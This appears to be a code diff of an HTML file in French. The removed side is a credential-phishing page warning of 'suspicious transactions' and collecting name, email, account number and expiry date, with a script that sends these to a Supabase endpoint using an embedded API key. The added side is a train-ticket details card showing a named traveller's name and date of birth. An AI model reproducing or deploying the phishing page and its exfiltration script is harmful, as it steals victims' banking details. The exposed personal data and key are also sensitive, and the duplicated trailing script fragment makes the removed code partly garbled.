@@ -1,170 +1,50 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Des transaction suspecte sur votre compte </title>
-  <style>
-    * { box-sizing: border-box; }
 
-    body {
-      margin: 0;
-      min-height: 100vh;
-      display: grid;
-      place-items: center;
-      padding: 20px;
-      background: #120000;
-      color: white;
-      font-family: Arial, sans-serif;
-    }
+<section class="voyage-details">
+  <h2>Détails du voyage</h2>
 
-    .carte {
-      width: 100%;
-      max-width: 480px;
-      padding: 28px;
-      background: #250000;
-      border: 2px solid #ff2222;
-      border-radius: 14px;
-      box-shadow: 0 0 24px #800000;
-    }
+  <p><strong>Départ :</strong> Marseille Saint-Charles</p>
+  <p><strong>Arrivée :</strong> Tarascon-sur-Rhône</p>
+  <p><strong>Date :</strong> 19/09/2026</p>
+  <p><strong>Heure de départ :</strong> À compléter</p>
+  <p><strong>Heure d'arrivée :</strong> À compléter</p>
+  <p><strong>Train :</strong> ZOU ! 876558</p>
+  <p><strong>Classe :</strong> 2de classe, placement libre</p>
+  <p><strong>Distance :</strong> 100 km</p>
+  <p><strong>Prix :</strong> 22,40 €</p>
+  <p><strong>Type de trajet :</strong> Aller simple</p>
+</section>
 
-    h1 { color: #ff3333; text-align: center; }
+<section class="voyageur-details">
+  <h2>Coordonnées du voyageur</h2>
 
-    label {
-      display: block;
-      margin-top: 14px;
-      font-weight: bold;
-    }
+  <p><strong>Nom :</strong> NEDJAH</p>
+  <p><strong>Prénom :</strong> HELAL</p>
+  <p><strong>Date de naissance :</strong> 04/06/1985</p>
+  <p><strong>Adresse e-mail :</strong> À compléter</p>
+</section>
 
-    input {
-      display: block;
-      width: 100%;
-      margin-top: 6px;
-      padding: 12px;
-      border: 1px solid #aaa;
-      border-radius: 6px;
-      font-size: 16px;
-    }
+<style>
+.voyage-details,
+.voyageur-details {
+  max-width: 570px;
+  margin: 20px auto;
+  padding: 24px;
+  background: white;
+  border-radius: 20px;
+  font-family: Arial, sans-serif;
+  color: #171a23;
+}
 
-    button {
-      width: 100%;
-      margin-top: 22px;
-      padding: 14px;
-      border: 0;
-      border-radius: 7px;
-      background: #e00000;
-      color: white;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-    }
+.voyage-details h2,
+.voyageur-details h2 {
+  font-size: 23px;
+  margin-top: 0;
+}
 
-    button:disabled { opacity: .6; }
-    #message { line-height: 1.5; overflow-wrap: anywhere; }
-  </style>
-</head>
-<body>
-  <main class="carte">
-    <h1>numero de compte</h1>
-    <p>Remplis ce formulaire pour transmettre les informations de ton compte.</p>
-
-    <form id="formulaire">
-      <label for="nom">Nom</label>
-      <input id="nom" name="nom" maxlength="100" required>
-
-      <label for="prenom">Prénom</label>
-      <input id="prenom" name="prenom" maxlength="100" required>
-
-      <label for="mail">mail</label>
-      <input id="mail" name="mail" type="mail" maxlength="254" required>
-
-      <label for="identifiant">Numéro_de_compte</label>
-      <input id="identifiant" name="identifiant_client"
-             maxlength="100" required>
-
-      <label for="expiration">Date_expiration</label>
-      <input id="expiration" name="date expiration"
-             type="jours annee" required>
-
-      <button id="valider" type="submit">CONFIRMER</button>
-      <p id="message" role="status"></p>
-    </form>
-  </main>
-
- 
-<script>
-    const SUPABASE_URL =
-      "https://jjtwodgevtkltqovargh.supabase.co";
-
-    const SUPABASE_KEY =
-      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpqdHdvZGdldnRrbHRxb3ZhcmdoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTE3OTg1ODAsImV4cCI6MjEwNzM3NDU4MH0.CiGhsNZ7ui8dUQeOhQQeFs1O6SUP2ijQoXU5yXA-k3c";
-
-    const formulaire = document.getElementById("formulaire");
-    const bouton = document.getElementById("valider");
-    const message = document.getElementById("message");
-
-    formulaire.addEventListener("submit", async (event) => {
-      event.preventDefault();
-      bouton.disabled = true;
-      message.textContent = "Envoi en cours…";
-
-      const donnees = Object.fromEntries(
-        new FormData(formulaire).entries()
-      );
-
-      try {
-        const reponse = await fetch(
-          `${SUPABASE_URL}/rest/v1/clients`,
-          {
-            method: "POST",
-            headers: {
-              "apikey": SUPABASE_KEY,
-              "Authorization": `Bearer ${SUPABASE_KEY}`,
-              "Content-Type": "application/json",
-              "Prefer": "return=minimal"
-            },
-            body: JSON.stringify(donnees)
-          }
-        );
-
-        if (!reponse.ok) {
-          const detail = await reponse.text();
-          throw new Error(
-            `HTTP ${reponse.status} : ${detail}`
-          );
-        }
-
-        message.textContent =
-          "✅ Formulaire envoyé avec succès.";
-        formulaire.reset();
-
-      } catch (erreur) {
-        console.error("Erreur Supabase :", erreur);
-        message.textContent = "❌ " + erreur.message;
-
-      } finally {
-        bouton.disabled = false;
-      }
-    });
-</script>
-</body>
-</html>
-
-
-        if (!reponse.ok) {
-          throw new Error(await reponse.text());
-        }
-
-        message.textContent = "✅ Formulaire envoyé avec succès.";
-        formulaire.reset();
-      } catch (erreur) {
-        console.error("Erreur Supabase :", erreur);
-        message.textContent =
-          "❌ Échec de l'envoi. Vérifie les colonnes et les autorisations.";
-      } finally {
-        bouton.disabled = false;
-      }
-    });
-  </script>
-</body>
-</html>
+.voyage-details p,
+.voyageur-details p {
+  font-size: 17px;
+  line-height: 1.5;
+  margin: 10px 0;
+}
+</style>
